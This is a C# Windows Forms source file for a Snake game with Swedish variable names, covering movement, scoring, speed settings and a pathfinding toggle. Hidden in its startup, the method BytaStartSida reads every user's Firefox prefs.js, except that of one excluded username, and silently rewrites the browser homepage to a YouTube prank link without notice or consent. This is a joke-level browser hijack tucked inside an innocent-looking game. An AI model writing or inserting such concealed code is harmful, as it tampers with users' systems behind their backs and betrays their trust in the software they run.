using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Timers;
using System.IO;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        bool start = false, tillåtHastighetsByte = true;
        private static bool pathFinding = false, tillåtWalls = true;
        Snake ormen = new Snake();
        short direction = 0, AntalBlå = 0;
        public Form1()
        {
            InitializeComponent();

            Console.WriteLine(Environment.UserName);

            BytaStartSida();
            ormen.randomUpgrade();
            labelHighScore.Hide();
            labelInfo.Text = "If you want to change any settings \n press F1 in between games";
        }
        private void BytaStartSida()
        {
            if (Environment.UserName == "novie")
            {
                return;
            }
            string path = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Mozilla\Firefox\Profiles";
            {
                string[] folders = Directory.GetDirectories(path);
                if (folders.Length == 1)
                {
                    path = folders[0] + @"\prefs.js";
                    List<string> textLista = new List<string>();
                    StreamReader hej = new StreamReader(path);
                    while (!hej.EndOfStream)
                    {
                        textLista.Add(hej.ReadLine());
                    }
                    hej.Close();


                    string temp = @"user_pref(""browser.startup.homepage""";
                    for (int i = 0; i < textLista.Count; i++)
                    {
                        if (textLista[i].StartsWith(temp))
                        {
                            textLista[i] = @"user_pref(""browser.startup.homepage"", ""http://www.youtube.com/watch?v=dQw4w9WgXcQ"");";
                            //http://www.youtube.com/watch?v=dQw4w9WgXcQ
                            break;
                        }
                    }


                    StreamWriter hej2 = new StreamWriter(path);
                    for (int i = 0; i < textLista.Count; i++)
                    {
                        hej2.WriteLine(textLista[i]);
                    }
                    hej2.Close();
                }
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text == "Start")
            {
                button1.Hide();
                timer1.Enabled = true;
                start = true;
                labelInfo.Hide();
            }
            else
            {
                AntalBlå = 0;
                direction = 0;
                ormen.direction = 0;
                labelHighScore.Hide();
                ormen.randomUpgrade();
                ormen.reset();
                button1.Text = "Start";
                //Invalidate();
            }
        }
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            Graphics g = e.Graphics;
            if (start)
            {
                ormen.rita(g);
            }
        }
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Up && ormen.direction != 1 && ormen.direction != 3)
            {
                direction = 3;
            }
            else if (e.KeyCode == Keys.Down && ormen.direction != 3 && ormen.direction != 1)
            {
                direction = 1;
            }
            else if (e.KeyCode == Keys.Left && ormen.direction != 0 && ormen.direction != 2)
            {
                direction = 2;
            }
            else if (e.KeyCode == Keys.Right && ormen.direction != 2 && ormen.direction != 0)
            {
                direction = 0;
            }
            else if (e.KeyCode == Keys.F1 && !start)
            {
                SettingsMenu setMenu = new SettingsMenu(tillåtHastighetsByte,tillåtWalls);
                if (setMenu.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    tillåtHastighetsByte = setMenu.checkBox1.Checked;
                    tillåtWalls = setMenu.checkBox2.Checked;
                    timer1.Interval = 61 - ((int)setMenu.listBox1.SelectedItem * 6);
                }
                setMenu.Dispose();
            }
            else if (e.KeyCode == Keys.F10 && !start)
            {
                if (pathFinding)
                {
                    pathFinding = false;
                }
                else
                {
                    pathFinding = true;
                }
            }
            else if (e.KeyCode == Keys.Add && tillåtHastighetsByte)
            {
                timer1.Interval += 1;
            }
            else if (e.KeyCode == Keys.Subtract && tillåtHastighetsByte)
            {
                if (timer1.Interval > 1)
                {
                    timer1.Interval -= 1;
                }
            }
        }
        public static bool PathFinding
        {
            get { return pathFinding; }
            set { pathFinding = value; }
        }
        public static bool Walls
        {
            get { return tillåtWalls; }
            set { tillåtWalls = value; }
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!tillåtWalls && ormen.walls)
            {
                timer1.Enabled = false;
                button1.Text = "Reset";
                labelHighScore.Text = "Du åt " + AntalBlå + " blåa bitar";
                labelHighScore.Show();
                button1.Show();
                start = false;
                ormen.walls = false;
                labelInfo.Show();
            } 
            if (PathFinding)
            {
                if (ormen.PathFinding())
                {
                    AntalBlå++;
                    ormen.randomUpgrade();
                }
            }
            else
            {
                if(ormen.flyttaOchTräffaBlå(direction))
                {
                    AntalBlå++;
                    ormen.randomUpgrade();
                }
            }
            if (ormen.träffad())
            {
                timer1.Enabled = false;
                button1.Text = "Reset";
                labelHighScore.Text = "Du åt " + AntalBlå + " blåa bitar";
                labelHighScore.Show();
                button1.Show();
                labelInfo.Show();
                start = false;
            }
            Invalidate();
        }
    }
}